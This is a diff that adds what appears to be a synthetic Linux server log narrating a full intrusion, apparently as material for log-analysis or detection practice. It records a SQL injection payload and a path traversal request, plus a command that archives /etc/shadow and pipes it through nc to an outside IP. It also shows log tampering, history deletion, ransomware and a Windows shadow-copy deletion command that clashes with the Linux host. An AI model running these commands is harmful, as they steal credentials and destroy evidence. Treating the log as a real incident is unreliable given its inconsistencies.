@@ -1,0 +1,59 @@
+2023-10-14 08:00:01 SYSTEM STARTUP: Linux kernel 5.15.0-88-generic x86_64
+2023-10-14 08:00:03 DAEMON Service 'systemd-journald' started successfully.
+2023-10-14 08:00:05 DAEMON Service 'rsyslog' started successfully.
+2023-10-14 08:00:10 DAEMON Service 'authd' started successfully.
+2023-10-14 08:00:15 DAEMON Service 'sshd' started successfully on port 22.
+2023-10-14 08:00:20 DAEMON Service 'ufw' firewall loaded: default DROP incoming.
+2023-10-14 08:05:12 LOGIN SUCCESS: User 'admin' from 192.168.1.45 via SSH.
+2023-10-14 08:10:00 INFO System health check OK. Memory usage: 14%, CPU load: 0.12.
+2023-10-14 08:15:33 LOGIN SUCCESS: User 'developer' from 192.168.1.102 via SSH.
+2023-10-14 08:30:45 CRON Task /etc/cron.hourly/logrotate executed successfully.
+2023-10-14 09:15:20 WARNING Network scan detected on external interface from 104.22.15.9 (SYN stealth scan).
+2023-10-14 09:16:05 WARNING Port probe: 104.22.15.9 accessed port 21 (CLOSED).
+2023-10-14 09:16:08 WARNING Port probe: 104.22.15.9 accessed port 22 (OPEN).
+2023-10-14 09:16:10 WARNING Port probe: 104.22.15.9 accessed port 80 (OPEN).
+2023-10-14 09:16:12 WARNING Port probe: 104.22.15.9 accessed port 3306 (FILTERED).
+2023-10-14 09:22:11 WARNING File access denied: /etc/shadow by user 'guest'
+2023-10-14 10:05:00 ERROR Database connection timeout on port 5432.
+2023-10-14 10:05:05 INFO Retrying database connection...
+2023-10-14 10:05:08 INFO Database connection established.
+2023-10-14 11:12:40 WEB_ACCESS: 104.22.15.9 GET /admin/login.php HTTP/1.1 200
+2023-10-14 11:15:02 WEB_ALERT: 104.22.15.9 SQL injection attempt in param 'user': ' OR 1=1 --
+2023-10-14 11:15:05 WEB_ACCESS: 104.22.15.9 POST /admin/login.php HTTP/1.1 401 Unauthorized
+2023-10-14 11:18:22 WEB_ALERT: 104.22.15.9 Path traversal attempt: GET /download.php?file=../../../../etc/passwd
+2023-10-14 12:44:40 LOGIN FAILED: User 'root' from 104.22.15.9 (Invalid password)
+2023-10-14 12:44:42 LOGIN FAILED: User 'root' from 104.22.15.9 (Invalid password)
+2023-10-14 12:44:45 LOGIN FAILED: User 'admin' from 104.22.15.9 (Invalid password)
+2023-10-14 12:44:48 LOGIN FAILED: User 'service' from 104.22.15.9 (Invalid password)
+2023-10-14 12:44:50 LOGIN FAILED: User 'root' from 104.22.15.9 (Invalid password)
+2023-10-14 12:44:52 LOGIN FAILED: User 'root' from 104.22.15.9 (Invalid password)
+2023-10-14 12:44:55 LOGIN SUCCESS: User 'root' from 104.22.15.9
+2023-10-14 12:45:01 AUDIT: Privilege escalation detected. UID 0 session opened on pts/2.
+2023-10-14 12:45:08 AUDIT: Command executed by root: 'uname -a; whoami; id'
+2023-10-14 12:45:15 AUDIT: SUID binary manipulation detected: chmod u+s /tmp/.bin
+2023-10-14 12:45:22 SUSPICIOUS FILE CREATED: /tmp/.hidden_stage (Executable ELF 64-bit)
+2023-10-14 12:45:30 AUDIT: File /etc/passwd modified by UID 0. New user 'sysadmin_' added.
+2023-10-14 12:45:35 AUDIT: New key added to /root/.ssh/authorized_keys from 104.22.15.9
+2023-10-14 12:45:45 DATA EXFILTRATION: Outbound connection established to 104.22.15.9:4444 (tar stream).
+2023-10-14 12:45:50 AUDIT: Command executed: 'tar -czf - /etc/shadow /var/log | nc 104.22.15.9 4444'
+2023-10-14 12:46:00 ANTI-FORENSICS: Log file tampering detected on /var/log/auth.log (truncated).
+2023-10-14 12:46:05 ANTI-FORENSICS: History cleared: rm /root/.bash_history
+2023-10-14 12:46:12 SYSTEM SHUTDOWN INITIATED by UID 0.
+2023-10-14 12:46:15 DAEMON Stopping system logging service...
+2023-10-14 12:46:18 SYSTEM HALTED.
+2023-10-14 13:00:00 SYSTEM STARTUP: Recovery boot completed.
+2023-10-14 13:00:05 DAEMON Service 'authd' started successfully.
+2023-10-14 13:00:10 DAEMON Service 'sshd' started successfully.
+2023-10-14 13:05:22 LOGIN SUCCESS: User 'admin' from 192.168.1.45
+2023-10-14 13:12:10 WARNING Unrecognized cron job detected in /etc/cron.d/sync_service
+2023-10-14 13:20:00 SUSPICIOUS PROCESS: /tmp/update_agent spawned by cron (UID 0)
+2023-10-14 13:20:15 NETWORK: Outbound DNS request to darknet-c2-server.onion.ws resolved to 185.220.101.5
+2023-10-14 13:21:00 FILE TAMPERING: Rapid encryption routine detected on /home/shares/documents
+2023-10-14 13:21:05 FILE ENCRYPTED: /home/shares/documents/financial_report_2023.xlsx.locked
+2023-10-14 13:21:07 FILE ENCRYPTED: /home/shares/documents/customer_db.sqlite.locked
+2023-10-14 13:21:10 FILE ENCRYPTED: /home/shares/documents/legal_contracts.pdf.locked
+2023-10-14 13:21:20 RANSOM NOTE CREATED: /home/shares/documents/README_RESTORE_FILES.txt
+2023-10-14 13:22:00 DEFENSE EVASION: Volume Shadow Copies deletion executed: vssadmin delete shadows /all /quiet
+2023-10-14 13:22:15 ALERT High I/O Disk anomaly: 1200 write operations/sec on storage pool
+2023-10-14 13:25:00 CRITICAL Host compromised. Network isolation triggered by IDS.
+2023-10-14 13:25:05 SYSTEM SHUTDOWN INITIATED by Emergency Response Protocol.
